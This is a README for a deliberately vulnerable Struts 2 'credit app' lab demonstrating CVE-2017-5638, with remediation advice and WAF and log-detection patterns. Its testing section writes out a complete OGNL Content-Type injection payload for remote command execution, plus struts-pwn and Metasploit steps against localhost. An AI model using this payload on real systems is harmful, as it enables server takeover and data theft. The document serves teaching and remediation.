# Credit App - CVE-2017-5638 Demonstration

A vulnerable Java web application built with Apache Struts 2.3.31, demonstrating CVE-2017-5638 - the critical Remote Code Execution vulnerability exploited in the 2017 Equifax data breach.

## ⚠️ Security Warning

**This application is intentionally vulnerable!** 

- **DO NOT deploy in production**
- For educational and demonstration purposes only
- Contains CVE-2017-5638 (CVSS 10.0 - Critical)
- Can be exploited for Remote Code Execution (RCE)

## 📋 Overview

This credit reporting application mimics a simplified version of credit bureau services, featuring:

- **Credit Check Portal** - Request and view credit reports
- **Consumer Data Management** - View consumer information
- **Dispute Management** - File and track credit disputes
- **File Upload** - Document upload (VULNERABLE to CVE-2017-5638)

## 🔍 CVE-2017-5638 Details

- **CVSS Score**: 10.0 (Critical)
- **Vulnerability Type**: Remote Code Execution (RCE)
- **Attack Vector**: Malicious Content-Type header in HTTP POST requests
- **Affected Versions**: Apache Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10
- **Fixed Versions**: 2.3.32, 2.5.10.1+
- **Real-World Impact**: 2017 Equifax breach (147 million records compromised)

### How the Vulnerability Works

The vulnerability exists in the Jakarta Multipart parser used by Apache Struts for handling file uploads. When processing multipart requests, the parser improperly handles the `Content-Type` header, allowing attackers to inject OGNL (Object-Graph Navigation Language) expressions that are evaluated on the server.

**Attack Flow:**
1. Attacker sends POST request to file upload endpoint
2. Malicious OGNL expression injected in Content-Type header
3. Struts parser evaluates the OGNL expression before action code runs
4. Arbitrary code executes on the server with application privileges

## 🚀 Quick Start

### Prerequisites

- **Java 8** (required for Struts 2.3.31 compatibility)
  - Java 11+ will cause ASM bytecode reading errors
  - Use `java -version` to verify
- Maven 3.6+
- Git

### Installing Java 8 on macOS

If you have Java 17 installed, you need to install and switch to Java 8:

#### Option 1: Using Homebrew (Recommended)

```bash
# Install Java 8 via Homebrew
brew install openjdk@8

# Add to PATH (add to ~/.zshrc or ~/.bash_profile)
export PATH="/opt/homebrew/opt/openjdk@8/bin:$PATH"
export JAVA_HOME="/opt/homebrew/opt/openjdk@8"

# Reload shell configuration
source ~/.zshrc  # or source ~/.bash_profile

# Verify Java 8 is active
java -version
# Should show: openjdk version "1.8.x"
```

#### Option 2: Using SDKMAN (Multiple Java Versions)

```bash
# Install SDKMAN
curl -s "https://get.sdkman.io" | bash
source "$HOME/.sdkman/bin/sdkman-init.sh"

# Install Java 8
sdk install java 8.0.392-zulu

# Use Java 8 for current shell
sdk use java 8.0.392-zulu

# Set Java 8 as default
sdk default java 8.0.392-zulu

# Verify
java -version
```

#### Option 3: Download from Oracle/Adoptium

1. Download Java 8 from [Adoptium](https://adoptium.net/temurin/releases/?version=8)
2. Install the `.pkg` file
3. Set JAVA_HOME:
```bash
export JAVA_HOME=$(/usr/libexec/java_home -v 1.8)
export PATH="$JAVA_HOME/bin:$PATH"
```

### Installation

```bash
# Clone the repository
git clone https://github.com/your-org/concert-bob-remediate.git
cd concert-bob-remediate
git checkout vuln-java-app

# Navigate to the credit app
cd app/credit-app

# Build the application
mvn clean package

# Run with embedded Jetty
mvn jetty:run
```

### Access the Application

Open your browser and navigate to:
```
http://localhost:8080/credit-app
```

## 🧪 Testing the Vulnerability

### Method 1: Using struts-pwn (Recommended)

```bash
# Install struts-pwn
git clone https://github.com/mazen160/struts-pwn.git
cd struts-pwn

# Check if vulnerable
python struts-pwn.py --url http://localhost:8080/credit-app/upload.action --check

# Execute commands
python struts-pwn.py --url http://localhost:8080/credit-app/upload.action -c "whoami"
python struts-pwn.py --url http://localhost:8080/credit-app/upload.action -c "id"
python struts-pwn.py --url http://localhost:8080/credit-app/upload.action -c "pwd"
```

### Method 2: Manual Exploitation with cURL

```bash
curl -X POST \
  http://localhost:8080/credit-app/upload.action \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
  -F "upload=@test.txt"
```

### Method 3: Metasploit

```bash
msfconsole
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS localhost
set RPORT 8080
set TARGETURI /credit-app/upload.action
exploit
```

## 🧪 Running Unit & OpenSSF Benchmark Tests

```bash
# Run all unit tests and OpenSSF benchmark tests
mvn test

# Run specifically the OpenSSF CVE Benchmark HTTP/HTTPS test suite
mvn test -Dtest=OssfCveBenchmarkHttpsIntegrationTest

# Run against a custom live HTTP or HTTPS URL endpoint
mvn test -Dtest=OssfCveBenchmarkHttpsIntegrationTest -Dtest.app.url=https://localhost:8443/credit-app/upload.action
```

## 📁 Project Structure

```
credit-app/
├── pom.xml                          # Maven configuration
├── src/
│   ├── main/
│   │   ├── java/com/creditapp/demo/
│   │   │   ├── actions/             # Struts Actions
│   │   │   │   ├── CreditCheckAction.java
│   │   │   │   ├── ConsumerDataAction.java
│   │   │   │   ├── DisputeAction.java
│   │   │   │   └── FileUploadAction.java (VULNERABLE)
│   │   │   ├── model/               # Data models
│   │   │   │   ├── Consumer.java
│   │   │   │   ├── CreditReport.java
│   │   │   │   └── Dispute.java
│   │   │   └── service/             # Business logic
│   │   │       ├── CreditService.java
│   │   │       └── ConsumerService.java
│   │   ├── resources/
│   │   │   └── struts.xml           # Struts configuration
│   │   └── webapp/
│   │       ├── WEB-INF/web.xml
│   │       ├── index.jsp
│   │       └── file-upload.jsp      # Vulnerable endpoint
│   └── test/
│       └── java/com/creditapp/demo/
│           └── actions/             # Unit tests
└── README.md
```

## 🔧 Remediation

### Immediate Actions

1. **Upgrade Apache Struts** to version 2.3.32 or 2.5.10.1+
   ```xml
   <dependency>
       <groupId>org.apache.struts</groupId>
       <artifactId>struts2-core</artifactId>
       <version>2.3.32</version>
   </dependency>
   ```

2. **Implement WAF Rules** to block OGNL patterns in headers
   ```
   # Block Content-Type headers with OGNL expressions
   SecRule REQUEST_HEADERS:Content-Type "@rx %\{" "deny,status:403"
   ```

3. **Review Logs** for exploitation attempts
   ```bash
   grep -i "ognl" /var/log/application.log
   grep -i "%{" /var/log/access.log
   ```

### Long-term Solutions

- Keep dependencies up-to-date
- Implement security scanning in CI/CD pipeline
- Use Web Application Firewall (WAF)
- Regular security audits and penetration testing
- Principle of least privilege for application runtime

## 📚 Additional Resources

- [CVE-2017-5638 NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)
- [Apache Struts Security Bulletin S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)
- [Equifax Data Breach Report](https://www.equifaxsecurity2017.com/)
- [struts-pwn Tool](https://github.com/mazen160/struts-pwn)
- [OWASP Struts Vulnerability Guide](https://owasp.org/www-community/vulnerabilities/Struts)

## 🤝 Contributing

This is a demonstration project for the Concert + Bob vulnerability remediation workflow. See the main repository README for contribution guidelines.

## 📄 License

This project is for educational purposes only. See LICENSE file for details.

## ⚖️ Legal Disclaimer

This application is intentionally vulnerable and should only be used in controlled environments for educational purposes. The authors are not responsible for any misuse or damage caused by this application.

---

**Made with Bob** | Part of Concert + Bob Vulnerability Remediation Demo